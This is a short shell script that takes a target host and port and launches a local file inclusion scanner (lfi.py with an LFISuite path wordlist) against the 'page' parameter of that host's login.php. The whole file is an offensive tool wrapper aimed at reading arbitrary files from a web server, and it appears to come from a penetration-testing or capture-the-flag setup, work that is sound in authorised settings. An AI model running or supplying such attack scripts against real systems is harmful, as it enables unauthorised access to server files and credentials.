#!/bin/sh
if [ "${#}" -eq 2 ]; then
	TARGET="${1}"
    PORT="${2}"
    set -e
    exec python3 lfi.py "http://${TARGET}:${PORT}/login.php?page=" --wordlist /tmp/LFISuite-pathtotest.txt
fi
